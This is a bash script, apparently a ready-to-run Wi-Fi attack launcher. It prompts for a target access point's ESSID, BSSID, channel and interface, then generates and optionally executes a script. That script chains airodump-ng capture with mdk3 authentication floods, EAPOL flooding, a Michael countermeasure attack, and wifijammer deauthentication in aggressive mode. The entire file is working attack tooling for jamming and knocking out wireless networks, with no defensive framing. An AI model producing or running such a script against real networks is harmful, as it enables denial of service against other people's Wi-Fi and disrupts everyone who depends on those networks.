#!/bin/bash

echo " "
echo "Opened new terminal !!!"
echo " "
echo "Write and save -> <ESSID> <BSSID> <Ch> <iface>"
echo " "
echo "exapmle -> Network 1A:2B:3C:4D:5E:6F 1 wlan0"
echo " " 

qterminal -e nano Target-AP.txt

sed -i -e 's/  */ /g' -e 's/^[[:blank:]]*//' -e 's/[[:blank:]]*$//' Target-AP.txt

echo "xterm -e 'timeout 32m airodump-ng -c <Ch> --bssid <BSSID> <iface>' | xterm -e 'sleep 5m && timeout 34m mdk3 <iface> a -a <BSSID>' | xterm -e 'sleep 5m 40s && timeout 33m mdk3 <iface> x 0 -t <BSSID> -n <ESSID> -s 200' | xterm -e 'sleep 25m && echo \"Michael attack begining !!!\" && timeout 31m mdk3 <iface> m -t <BSSID>' | xterm -e 'sleep 26m 2s && timeout 35m python3 /root/wifijammer/wifijammer.py -a <BSSID> -c <Ch> -i <iface> --aggressive'" > "attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"

sed -i -e "s/<ESSID>/$(cut -d ' ' -f 1 Target-AP.txt)/g" -e "s/<BSSID>/$(cut -d ' ' -f 2 Target-AP.txt)/g" -e "s/<Ch>/$(cut -d ' ' -f 3 Target-AP.txt)/g" -e "s/<iface>/$(cut -d ' ' -f 4 Target-AP.txt)/g" "attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"

chmod +x *.sh

echo " "
read -p "Do you want now attack? (y/n) " RESP
echo " "
if [ "$RESP" = "y" ]; then
  echo "READY ATTACKING !!!"
  echo " "
else
  echo "Use attack file -> ./attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"
  exit
fi

./"attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"
